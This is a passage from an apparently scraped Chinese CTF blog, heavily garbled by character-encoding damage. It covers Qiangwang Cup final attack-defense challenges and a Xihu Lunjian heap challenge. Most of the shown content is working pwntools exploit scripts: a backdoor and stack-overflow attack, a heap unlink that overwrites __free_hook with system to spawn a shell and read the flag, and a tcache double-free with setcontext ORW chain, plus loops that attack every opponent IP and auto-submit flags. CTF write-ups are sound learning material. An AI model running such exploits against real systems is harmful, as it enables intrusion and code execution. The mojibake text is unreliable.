pwn()","link":"/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/"},{"title":"å¼ºç½‘æ¯_final","text":"å¼ºç½‘æ¯_final æ²¡æƒ³åˆ°ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹å°±å›åˆ°äº†å®¶ä¹¡æ²³å—ï¼Œå¼ºç½‘æœ‰æ’é¢ï¼ï¼ çº¿ä¸‹èµ›èµ›åˆ¶ä¸ºAD(awd)å’ŒRW(real world)ï¼Œreal worldå°±ç›¸å½“ä¸æŒ–æ˜0dayï¼Œéš¾åº¦ä¸è¨€è€Œå–»ï¼ŒADçš„è¯åªæœ‰pwné¢˜ï¼Œå 50%çš„åˆ†æ•°ï¼Œå› æ­¤pwné‡‡ç”¨çš„æ˜¯åªæ‰“adçš„ç­–ç•¥ï¼Œæœ€åä¹Ÿå–å¾—äº†ä¸é”™çš„æ•ˆæœã€‚ ADçš„èµ›å‰å‡†å¤‡æ‰“ADè¦æƒ³è·å¾—ä¸é”™çš„æˆç»©ï¼Œæˆ‘è®¤ä¸ºæœ€é‡è¦çš„å°±æ˜¯è¦æŠ¢å å…ˆæœºã€‚ç‡å…ˆå‘ç°æ¼æ´ï¼Œå¹¶å†™å‡ºexpï¼Œå¾€å¾€èƒ½æ‰“å¾—åˆ«äººæªæ‰‹ä¸åŠï¼Œå› æ­¤èµ›å‰çš„è„šæœ¬å‡†å¤‡å¾€å¾€éå¸¸é‡è¦ã€‚ å‡†å¤‡è„šæœ¬ä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼š1.æ‰¹é‡IPç”Ÿæˆè„šæœ¬ã€‚2.æ‰¹é‡äº¤flagçš„è„šæœ¬ã€‚æ‰¹é‡IPç”Ÿæˆè„šæœ¬ï¼š 12345678910111213141516171819import sysf = open(&quot;ip.txt&quot;,&quot;wb&quot;)try: ip = sys.argv[1] range_ = int(sys.argv[2]) for i in range(1,range_): t = ip.replace(&quot;x&quot;,str(i)) f.write(t+'\\n')except: print &quot;usage: python %s ip range&quot; % sys.argv[0] f.close()f.close()usage:python ip.py 172.168 .1 .1 :x 20 æ‰¹é‡äº¤flagè„šæœ¬ï¼š 1234567891011121314151617181920212223if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] while 1: for ip in ips: try: sleep(0.3) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token9013e05455d' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) except Exception,err: # p.close() print err continueé€‚ç”¨äºæœ‰curlæ¥å£çš„ADï¼Œè‹¥æ²¡æ­¤æ¥å£ï¼Œåˆ™å…ˆæŠ“åŒ…ï¼Œå†™å‡ºsub_flagå‡½æ•°æ‰¹é‡æäº¤ã€‚ ADå…¨ç¨‹é«˜èƒ½Pwné¢˜ä¸€å…±å‡ºäº†4é“ã€‚ win(ä¸€é“windowsä¸‹çš„æ ˆæº¢å‡º) pd0(goå†™çš„ä¸€ä¸ªæ¡†æ¶) sort(vm_pwn) thrd(çº¿ç¨‹å †é¢˜) ä¸ªäººè®¤ä¸ºæœ€éš¾çš„æ˜¯pd0ï¼Œå¥½åƒåªæœ‰0x300Rç¬¬äºŒå¤©åšå‡ºæ¥äº†ï¼Œç–¯ç‹‚æ‰“ç¾¤åœºã€‚ä¸è¿‡æˆ‘ä»¬å®ˆä½äº†ï¼Œruanå¸ˆå‚…åœ¨githubä¸Šæ‰¾åˆ°äº†æºç ï¼Œæ‰“patchæ”¹äº†max_sizeï¼Œnb! ä¸‹é¢ä¾æ¬¡åˆ†æï¼š 0x01 winwinæ˜¯ç¬¬ä¸€ä¸ªæ”¾å‡ºçš„é¢˜ç›®ï¼Œä»…è¿‡4åˆ†é’Ÿvidar-timeå°±å‘èµ·è¿›æ”»ï¼Œæˆ‘ä»¬ä¹Ÿç¬é—´ååº”è¿‡æ¥è¿™é“é¢˜ç›®æœ‰åé—¨æœç„¶ï¼š 12345678910111213141516171819if ( !memcmp(v43, &quot;vvqqccqaFEFH&quot;, v45) &amp;&amp; v44 == 12 ) æˆ‘patchè¿‡äº†å·²ç» { v46 = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !v46 ) { v47 = sub_1400060E0(std::cout, (__int64)&quot;Can't open the flag file&quot;); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v47, sub_1400062B0); exit(1); } while ( !feof(v46) ) { if ( fgets(&amp;Buf, 128, v46) ) { v48 = sub_1400060E0(std::cout, (__int64)&amp;Buf); //cout&lt;&lt;flagï¼ï¼ std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v48, sub_1400062B0); } } fclose(v46); } ç¬¬ä¸€æ³¢è„šæœ¬ï¼š 12345678910111213141516171819202122def main(host,port=16957): global p if host: p = remote(host,port,timeout=1) else: p = process(&quot;./pwn_bak.bak.bak&quot;) # debug(0x000000000000107B) p.recvuntil(&quot;[*] Rounds 1 $&quot;) p.sendline(&quot;Banner hide&quot;) p.sendline(&quot;wwssadadBABA&quot;) p.recvuntil(&quot;wwssadadBABA ]\\r\\n&quot;) try: # p.sendline(&quot;cat flag&quot;) # p.recv(timeout=0.5) flag = p.recvuntil(&quot;\\r\\n&quot;,drop=True,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; ç›´æ¥æ‰“åˆ°ç¬¬å…­ï¼Œä½†å…¶ä»–é˜Ÿä¹Ÿä¸æ˜¯åƒç´ çš„ï¼Œpatchæ”¹â€wwssadadBABAâ€ä¸ºå…¶ä»–å­—ç¬¦ä¸²ã€‚ ä¹‹ååˆæœ‰ä¸€ä¸ªæ´åœ¨è¿™é‡Œï¼š 12345678910111213141516171819202122sub_1400060E0(v5, (__int64)&quot;Please input the password: &quot;); sub_140007060(std::cin, &amp;password); v6 = &amp;password; v7 = (char *)password; v8 = v31; if ( v31 &gt;= 16 ) v6 = password; memcpy(&amp;Dst, v6, Size); sizeä¸ºå®é™…çš„passwordé•¿åº¦ if ( strncmp(&amp;Dst, &quot;I_Love_QWB&quot;, 0xAui64) ) { v9 = sub_1400060E0(std::cout, (__int64)&quot;Your password &quot;); v10 = sub_1400060E0(v9, (__int64)&amp;Dst); v11 = sub_1400060E0(v10, (__int64)&quot; seems not true!&quot;); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v11, sub_1400062B0); sub_1400060E0(std::cout, (__int64)&quot;Try again: &quot;); sub_140007060(std::cin, &amp;password); v12 = &amp;password; v7 = (char *)password; v8 = v31; if ( v31 &gt;= 0x10 ) v12 = password; memcpy(&amp;Dst, v12, Size); å¯è§ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥è¾ƒé•¿çš„passwordå¯ä»¥æ³„éœ²å‡ºstackä¸Šçš„åœ°å€ï¼Œç„¶åå†å€ŸåŠ©ç¬¬äºŒæ¬¡çš„try againè¦†ç›–è¿”å›åœ°å€ä¸ºä¸Šé¢åé—¨å‡½æ•°çš„åœ°å€å³å¯! patché™åˆ¶sizeä¸º0x30ï¼Œæ ˆæº¢å‡ºä¸äº†ã€‚ 0x02 pd0æºç åœ°å€ï¼šhttps://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go Fixingï¼šEither the padding should be removed or a handler should be modified to not leak the information, e.g. by changing the max allowed size of the generated picture. 0x03 sortæ„Ÿè§‰æ˜¯æœ€æœ‰æ„æ€çš„ä¸€é¢˜ã€‚é¢˜ç›®æ„æ€æ˜¯è¦å®Œæˆå¯¹ä¸€ä¸ªéšæœºæ•°ç»„è¿›è¡Œæ’åºï¼Œæ‰€æ‰§è¡Œçš„æ±‡ç¼–æŒ‡ä»¤è¶Šå°‘åˆ†æ•°è¶Šé«˜ï¼Œåˆ†é«˜çš„ä¸€æ–¹è·èƒœï¼Œæ”»å‡»æ–¹è·èƒœæ‹¿flagï¼Œé˜²å®ˆæ–¹è·èƒœåˆ™æ”»å‡»æ–¹æ— æ³•æ‹¿flag.åŒæ—¶æœ‰ç»™å‡ºäº†å‡ºé¢˜äººè‡ªå·±å†™çš„æ±‡ç¼–æŒ‡ä»¤ç³»ç»Ÿï¼Œè¿˜è¦opcodeå’Œåˆèµ›çš„qwloginä¸€æ ·ï¼Œçœå»äº†é€†opcodeçš„æ—¶é—´ã€‚ opcode: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;//INST#define HLT 0x00#define MOV 0x01//CALC#define ADD 0x02#define SUB 0x03#define MUL 0X04#define DIV 0x05#define MOD 0X06//BIT#define XOR 0x07#define OR 0x08#define AND 0x09#define SHL 0x0a#define SHR 0x0b#define NOT 0x0c//STACK#define POP 0x0d#define PUSH 0x0e//FUNC#define CALL 0x10#define RET 0x11//JMP#define CMP 0x12#define JMP 0x13#define JE 0x14#define JNE 0x15#define JG 0x16#define JNG 0x17#define JL 0x18#define JNL 0x19#define JA 0x1a#define JNA 0x1b#define JB 0x1c#define JNB 0x1d//INT#define SYSCALL 0x20//ADDR#define RR 0X00#define RL 0x01#define LR 0x02#define RS 0x03#define SR 0x04#define RI 0x05#define R_ 0X06#define I_ 0x07#define L_ 0x08#define S_ 0x09#define __ 0x0a#define PR 0x0b //RegLoad Reg#define RP 0x0c //Reg RegLoad#define QR 0x0d //RegStack Reg#define RQ 0x0e //Reg RegStack//WIDTH#define BYTE 0x10#define WORD 0x20#define DWORD 0x30#define QWORD 0x40#define WIDTH(X) (X &amp; 0xf0)#define ADDR(X) (X &amp; 0x0f)#define S_O(X) (X |= 0b0000000000000001)#define S_S(X) (X |= 0b0000000000000010)#define S_Z(X) (X |= 0b0000000000000100)#define S_C(X) (X |= 0b0000000000001000)#define C_O(X) (X &amp;= ~(0b0000000000000001))#define C_S(X) (X &amp;= ~(0b0000000000000010))#define C_Z(X) (X &amp;= ~(0b0000000000000100))#define C_C(X) (X &amp;= ~(0b0000000000001000))#define R_O(X) (X &amp; 0b0000000000000001)#define R_S(X) ((X &amp; 0b0000000000000010) &gt;&gt; 1)#define R_Z(X) ((X &amp; 0b0000000000000100) &gt;&gt; 2)#define R_C(X) ((X &amp; 0b0000000000001000) &gt;&gt; 3)enum SYSCALLS { _SYS_OPEN = 0, _SYS_READ = 1, _SYS_WRITE, _SYS_CLOSE}; æ¥ä¸‹æ¥å°±å¾—æ‰‹æ’•æ±‡ç¼–äº†ï¼Œæˆ‘ä»¬é€‰æ‹©äº†è¾ƒä¸ºç®€å•çš„å†’æ³¡æ’åºï¼Œåˆå› ä¸ºæ²¡æœ‰é‚£ç§ç›´æ¥æ“ä½œå†…å­˜çš„æŒ‡ä»¤ï¼Œå°±åªèƒ½ç”¨å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¼è‡´æ•ˆç‡å¹¶ä¸æ˜¯å¾ˆé«˜ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *context.arch = 'amd64'def main(host,port=14640): global p if host: p = remote(host,port) else: # pass p = process(&quot;./BATTLE&quot;,aslr=False) # gdb.attach(p,&quot;b *0x555555554000+0x00000000000EEb9 if $rdx == 0x1e&quot;) # gdb.attach(p,&quot;b *0x555555554000+0x00000000000F238&quot;) p.recvuntil(&quot;Beat Me!&quot;) code = '' # loop1: code += p8(0x12) + p8(0x15) + p8(3) + p8(99) # cmp r3,99 code += p8(0x16) + p8(0x17) + p8(0x65) # JG exit code += p8(0x1) + p8(0x40) + p8(6) + p8(3) # mov r6,r3 code += p8(0x1) + p8(0x15) + p8(0) + p8(99) # mov r0,99 code += p8(0x3) + p8(0x40) + p8(0) + p8(6) # sub r0,r6 code += p8(0x1) + p8(0x45) + p8(4) + p64(0) # mov r4,0 # loop2: code += p8(0x12) + p8(0x40) + p8(4) + p8(0) # cmp r4,r0 code += p8(0x14) + p8(0x17) + p8(0x38) # je update code += p8(0x1) + p8(0x40) + p8(5) + p8(4) # mov r5,r4 code += p8(0x4) + p8(0x25) + p8(5) + p16(8) # mul r5,8 code += p8(0x1) + p8(0x4c) + p8(1) + p8(5) # mov r1,mem[r5] code += p8(0x1) + p8(0x40) + p8(6) + p8(5) # mov r6,r5 code += p8(0x2) + p8(0x25) + p8(6) + p16(8) # add r6,8 code += p8(0x1) + p8(0x4c) + p8(2) + p8(6) # mov r2,mem[r6] code += p8(0x12) + p8(0x40) + p8(1) + p8(2) # cmp r1,r2 code += p8(0x1c) + p8(0x17) + p8(8) # jb next code += p8(0x1) + p8(0x4b) + p8(6) + p8(1) # mov mem[r6],r1 code += p8(0x1) + p8(0x4b) + p8(5) + p8(2) # mov mem[r5],r2 # next: code += p8(0x2) + p8(0x25) + p8(4) + p16(1) # add r4,1 code += p8(0x13) + p8(0x47) + p64(-0x3f+0x10000000000000000)# jmp loop2 # update: code += p8(0x2) + p8(0x25) + p8(3) + p16(1) # add r3,1 code += p8(0x13) + p8(0x47) + p64(-0x6c+0x10000000000000000)# jmp loop1 # exit: code += p8(0x20) + &quot;AAAAAAAAA&quot; p.send(code) p.recvuntil(&quot;WINNER!\\n&quot;) try: # p.recvuntil(&quot;ftp&gt;&quot;) # p.sendline(&quot;type flag.txt&quot;) # p.recv(timeout=0.5) flag = p.recvuntil(&quot;\\n&quot;,drop=True,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; # p.interactive()if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] while 1: for ip in ips: try: sleep(0.3) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token7024a591c07' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) # pause() except Exception,err: p.close() print err continue VM_pwnä¸€å®šè¦è€å¿ƒï¼ï¼ï¼ä¸€è¾¹å†™ï¼Œä¸€è¾¹è°ƒã€‚ 0x04 thrdæœ€åä¸€é¢˜ç»ˆäºæ˜¯heapé¢˜äº†ï¼Œä½†ç‰µæ‰¯åˆ°çº¿ç¨‹çš„æ¡ä»¶ç«äº‰é—®é¢˜ï¼Œä½¿å¾—è°ƒè¯•èµ·æ¥ä¼šå¾ˆå¥‡æ€ªã€‚ æ¼æ´å­˜åœ¨äºeditå‡½æ•°ä¸­ï¼š 123456789101112131415161718192021int __fastcall edit(unsigned int a1, unsigned int a2, int a3){ unsigned __int64 v3; // rax int v4; // er12 if ( a1 &lt;= 0xF ) { if ( heaplist[a1] ) { v3 = sizelist[a1] - 4LL; å½“sizeä¸º0æ—¶ï¼Œv3=-4(unsigned int)ï¼Œé€ æˆå †æº¢å‡º if ( a2 &lt;= v3 ) { v4 = a3; pthread_mutex_lock(&amp;mutex); *(_DWORD *)(heaplist[a1] + a2) = v4; LODWORD(v3) = pthread_mutex_unlock(&amp;mutex); } } } return v3;} è¿˜æœ‰ä¸€ä¸ªæ´æ˜¯åœ¨encä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall enc(unsigned int a1, int a2){ __int64 idx; // rbx const char *v3; // rdi unsigned int content_len; // er12 unsigned int v5; // eax _DWORD *v6; // rdx __int64 v7; // rax if ( a1 &lt;= 0xF ) { idx = a1; v3 = (const char *)heaplist[a1]; if ( v3 ) { content_len = strlen(v3); pthread_mutex_lock(&amp;mutex); v5 = content_len &gt;&gt; 2; if ( (content_len &gt;&gt; 2) &amp; 3 ) { ++v5; v6 = (_DWORD *)heaplist[idx]; } else { v6 = (_DWORD *)heaplist[idx]; if ( !v5 ) {LABEL_7: pthread_mutex_unlock(&amp;mutex); return; } } v7 = (__int64)&amp;v6[v5]; do { *v6 ^= a2; ++v6; } while ( v6 != (_DWORD *)v7 ); goto LABEL_7; } }} è¿™ä¸ªçš„é€»è¾‘ä¸»è¦æ˜¯è¿›è¡Œäº†å¼‚æˆ–çš„æ“ä½œï¼Œä½†æ¼æ´æ˜¯strlen()å‡½æ•°ï¼Œå½“å¡«æ»¡å †åstrlenä¼šæ‹¿åˆ°ä¸‹ä¸€ä¸ªheapçš„sizeä¸ºï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªheapçš„sizeã€‚ ç¨‹åºä¸€å¼€å§‹ç»™å‡ºäº†elfåŸºåœ°å€ï¼ŒPIEç™½å¼€äº†ï¼Œè¿˜èƒ½æ§åˆ¶next heapâ€™s sizeï¼Œå› æ­¤å¯ä»¥unlinkï¼Œä½†ä¸­é—´showæ³„éœ²çš„æ—¶å€™ï¼Œç”±äºçº¿ç¨‹ç«äº‰é—®é¢˜ï¼Œéœ€è¦å¯¹heapè¿›è¡Œä¿®å¤ï¼Œå½“æ—¶æ˜¯æŠ„æµé‡æ‰çŸ¥é“çš„ï¼Œå¾ˆè¿·ã€‚ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from pwn import *context.arch = 'amd64'def add(idx,sz): return p32(1) + p32(idx) + p32(sz)def show(idx): return p32(3) + p32(idx)def dele(idx): return p32(4) + p32(idx)def xor_(idx,value): return p32(6) + p32(idx) + p32(value)def edit(idx,offset,value): return p32(2) + p32(idx)+p32(offset) + p32(value)def main(host,port=17066): global p if host: p = remote(host,port,timeout=1) else: p = process(&quot;./pwn_bak.bak.bak&quot;) # debug(0x000000000000107B) libc.address = 0 p.recvuntil(&quot;mem: &quot;) elf_addr = int(p.recvuntil('\\n',drop=True),16) - 0x2021a0 backdoor = elf_addr+0x000000000000DB0 info(&quot;elf : &quot; + hex(elf_addr)) ptr = elf_addr + 0x000000000202120 action = '' action += add(0,0x28) + add(1,0xf0) + add(2,0xf0) + add(3,0xf0) + add(4,0xf0) + add(5,0xf0) for i in range(0,0x28,4): action += edit(0,i,u32(&quot;efbead6e&quot;.decode('hex'))) action += xor_(0,0x401) data = p32(0)*2+p64(0x21) data += p32(0xffffffff&amp;(ptr-0x18)) + p32((ptr-0x18)&gt;&gt;32) data += p32(0xffffffff&amp;(ptr-0x10)) + p32((ptr-0x10)&gt;&gt;32) data += p32(0x20) + p32(0) for i in range(0,0x28,4): action += edit(0,i,u32(data[i:i+4])) action += dele(1) + add(6,0xf0) action += edit(6,0x10,0x30) + edit(6,0x18,0x11) action += edit(0,0x18,0xffffffff&amp;ptr) + edit(0,0x1c,ptr&gt;&gt;32) action += edit(0,0x8,0xffffffff&amp;(elf_addr+0x201F50)) + edit(0,0xc,(elf_addr+0x201F50)&gt;&gt;32) action += show(1) p.sendline(action) p.recvuntil(&quot;content: &quot;) libc.address = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) - libc.symbols[&quot;free&quot;] info(&quot;libc : &quot; + hex(libc.address)) sleep(1) action = '' action += edit(0,0x10,0xffffffff&amp;(libc.symbols[&quot;__free_hook&quot;]-8)) + edit(0,0x14,(libc.symbols[&quot;__free_hook&quot;]-8)&gt;&gt;32) action += edit(2,0,u32(&quot;/bin&quot;)) + edit(2,0x4,u32(&quot;/sh\\x00&quot;)) action += edit(2,8,0xffffffff&amp;(libc.symbols[&quot;system&quot;])) + edit(2,0xc,(libc.symbols[&quot;system&quot;])&gt;&gt;32) action += dele(2) p.sendline(action) sleep(0.3) p.sendline(&quot;;echo hack_by_qwruan &amp;&amp; cat flag&quot;) p.recvuntil(&quot;qwruan\\n&quot;) try: p.recvuntil(&quot;flag&quot;,timeout=0.5) flag = &quot;flag&quot; + p.recvuntil(&quot;\\n&quot;,timeout=0.5) info(flag) p.close() return flag except Exception,err: print err p.close() return &quot;bad_luck&quot; # p.interactive()if __name__ == &quot;__main__&quot;: # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./pwn&quot;,checksec=False) ips = [i.strip() for i in open(&quot;ip.txt&quot;,&quot;rb&quot;).readlines()] libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) while 1: for ip in ips: try: sleep(1) flag = main(ip) # flag = main(args[&quot;REMOTE&quot;]) info(flag) url = 'https://172.20.1.1/Answerapi/sub_answer_api' token = 'token9013e05455d' cmds = 'curl -k {} -d &quot;answer={}&amp;playertoken={}&quot;'.format(url,flag.strip(),token) print cmds if 'flag' in cmds: os.system(cmds) except Exception,err: p.close() print err continue ruanå¸ˆå‚…nbï¼Œæˆ‘è¿˜æ˜¯å¤ªå¹´è½»äº†ã€‚è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°:D","link":"/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/"},{"title":"è¥¿æ¹–è®ºå‰‘","text":"è¥¿æ¹–è®ºå‰‘ ezhttp èŠ±äº†ä¸€ä¸‹åˆåšè¿™é¢˜ï¼Œè¢«æ²¡æœ‰ç¬¦å·è¡¨çš„libcæŠ˜ç£¨çš„æ­»å»æ´»æ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”µè„‘ubuntu18çš„libcTMå‡çº§åˆ°1.3çš„æ²¡æ³•tcache double freeäº†ï¼Œèµ›åè‡ªå·±ç¼–è¯‘äº†ä¸€ä¸ªå¸¦dbgç¬¦å·çš„ï¼Œå†ld_preloadå°±å¯ä»¥äº†ã€‚ è¿™é¢˜æ˜¯é“å¥—äº†å±‚ç±»ä¼¼httpæ”¶å‘å½¢å¼çš„å †ä½“ï¼Œé€†è¿™ä¸ªæ”¶å‘èŠ±è´¹äº†å¤§éƒ¨åˆ†çš„æ—¶é—´ï¼Œè¿™ä¸ªå°±æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œåªè¦å†™ä¸‹åé¢çš„åˆ©ç”¨æ‰‹æ®µå§ï¼š addå‡½æ•°ï¼š 12345678910v2 = strlen(&amp;src); heaplist[2 * i] = malloc(v2); if ( !heaplist[2 * i] ) { quit((__int64)&quot;HTTP/1.1 500 INTERNAL SERVER ERROR&quot;, (__int64)&quot;Something error!&quot;); exit(0); } heaplist[2 * i + 1] = (void *)strlen(&amp;src); v3 = strlen(&amp;src); strncpy((char *)heaplist[2 * i], &amp;src, v3); çœ‹åˆ°å®ƒæ˜¯ç”¨strlenè·å–contentçš„é•¿åº¦ï¼Œä¹‹åmallocå†strncpyï¼Œstrlenä¼šè¢«â€™\\x00â€™æˆªæ–­ï¼Œåœ¨åé¢æ„é€ æ—¶ç»™æˆ‘å¸¦æ¥äº†ä¸å°‘çš„éº»çƒ¦ã€‚ deleå‡½æ•°æœ‰uaf: 123free(heaplist[2 * idx]);heaplist[2 * idx + 1] = 0LL; // UAFquit((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;Delete success!&quot;); editè¿˜æ˜¯æ­£å¸¸çš„ï¼Œå“¦å¯¹ç»“å°¾åŠ ä¸ªâ€™\\nâ€™ï¼š 12345678for ( i = 0; src[i] != '\\n'; ++i ) ;if ( v4 &lt; 0 || v4 &gt; 15 || !heaplist[2 * v4] || i &gt; (__int64)heaplist[2 * v4 + 1] ){ quit((__int64)&quot;HTTP/1.1 404 Not Found&quot;, (__int64)&quot;No!You can't&quot;); exit(0);}memcpy(heaplist[2 * v4], src, i); ç”±äºæ²¡æœ‰showï¼Œaddå‡½æ•°ç»™äº†æˆ‘ä»¬å †åœ°å€å› æ­¤è‡ªç„¶æƒ³åˆ°double freeæ‰“tcacheçš„ç»“æ„ä½“ï¼Œä¹‹ådele0x100çš„å †è¿›å…¥unsortedbinå†™å…¥main_arenaåœ°å€ï¼Œdouble freeåŒæ—¶æ”¹main_arenaå2å­—èŠ‚æ¥æ‰“stdoutï¼Œä½†ç”±äºaddæ—¶çš„â€™\\x00â€™é™åˆ¶ï¼Œè¦æ”¹å†™åœ°å€ä¸ºstdoutä¸Šé¢çš„åœ°å€ï¼Œå¹¶å¡«å……â€™aâ€™ä½†0xfbad18ä¸èƒ½æ”¹ï¼Œå…¶ä»–éƒ½å¡«â€™aâ€™ï¼Œå¼€å§‹ä»¥ä¸ºä¸è¡Œï¼Œä½†ä»èƒ½æˆåŠŸæ³„éœ²ï¼Œæœ‰ç‚¹nbï¼Œä¹‹åç”±äºæœ‰seccompæ‰€ä»¥æ”¹free_hookä¸ºsetcontext+53ï¼Œå¹¶åœ¨0x100çš„å †é‡Œå†™payloadï¼Œä¹‹ådeleã€‚åˆ©ç”¨setcontext+53æ¥æ„é€ å¯„å­˜å™¨(rdi=0,rsi=heap+0xa0,rdx=0x200)ï¼Œrspæ”¹åˆ°heap+0xa8ï¼Œä¹‹åè¿”å›æ—¶å»æ‰§è¡Œreadè¯»å…¥åç»­çš„shellcodeåˆ°æ ˆé‡Œé¢rspä½ç½®ç„¶åretåˆ°shellcodeæ¥orwã€‚ 12345678910111213141516171819pwndbg&gt; telescope 0x555556d1f32000:0000â”‚ 0x555556d1f320 â—‚â€” 0x67616c662f2e /* './flag' */01:0008â”‚ 0x555556d1f328 â—‚â€” 0x0... â†“pwndbg&gt; telescope 0x555556d1f320 10000:0000â”‚ 0x555556d1f320 â—‚â€” 0x67616c662f2e /* './flag' */01:0008â”‚ 0x555556d1f328 â—‚â€” 0x0... â†“0e:0070â”‚ 0x555556d1f390 â€”â–¸ 0x555556d1f3c0 â€”â–¸ 0x7fb514444a78 (mblen+104) â—‚â€” pop rax0f:0078â”‚ 0x555556d1f398 â€”â–¸ 0x555556d21000 â—‚â€” 0x010:0080â”‚ 0x555556d1f3a0 â—‚â€” 0x200... â†“12:0090â”‚ 0x555556d1f3b0 â—‚â€” 0x0... â†“14:00a0â”‚ rsi 0x555556d1f3c0 â€”â–¸ 0x7fb514444a78 (mblen+104) â—‚â€” pop rax... â†“17:00b8â”‚ 0x555556d1f3d8 â—‚â€” 0x018:00c0â”‚ 0x555556d1f3e0 â€”â–¸ 0x7fb5144d39d5 (__time_syscall+5) â—‚â€” syscall19:00c8â”‚ rsp 0x555556d1f3e8 â—‚â€” 0x6161616161616161 ('aaaaaaaa') exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def add(content): p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /create Cookie: user[^=admin token: \\r\\r\\n\\r\\ncontent={} ').format(content))def dele(idx): p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /del Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={} ').format(idx))def edit(idx,content): # sleep(0.5) p.recvuntil(&quot;======= Send Http packet to me: ========\\n&quot;) p.send(('POST /edit Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={0}&amp;content={1}&amp;').format(idx,content))def add2(content): p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /create Cookie: user[^=admin token: \\r\\r\\n\\r\\ncontent={} ').format(content))def dele2(idx): p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /del Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={} ').format(idx))def edit2(idx,content): # sleep(0.5) p.recvuntil(&quot;======= Send Http packet to me: ========&quot;) p.send(('POST /edit Cookie: user[^=admin token: \\r\\r\\n\\r\\nindex={0}&amp;content={1}&amp;').format(idx,content))def main(host,port=55504): global p if host: p=remote(host,port) else: p=process([&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;,&quot;./ezhttp&quot;],env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) # p=process(&quot;./ezhttp&quot;) add('a'*0x40) p.recvuntil(&quot;Your gift: &quot;) heap=int(p.recv(14),16) success(&quot;heap: &quot;+hex(heap)) add('b'*0x40) # dele(1) dele(0) dele(0) # debug(0x0000000000019E3) add('a'*0x40) dele(0) edit(2,p64(heap-0x250)[:6]+'\\n') add('a'*0x40) add('\\xff'*0x40) add('a'*0x10) add('a'*0x100) add('a'*0x30) dele(6) add('a'*0x100) dele(6) edit(4,p8(0x1)*0x40+'\\n') dele(0) dele(0) edit(2,p64(heap+0xa0+0x20)[:6]+'\\n') gdb.attach(p) stdout=int(raw_input('input: '),16) edit(8,p16(stdout)+'\\n') add('a'*0x40) add('a'*0x40) # add('a'*0x40) # 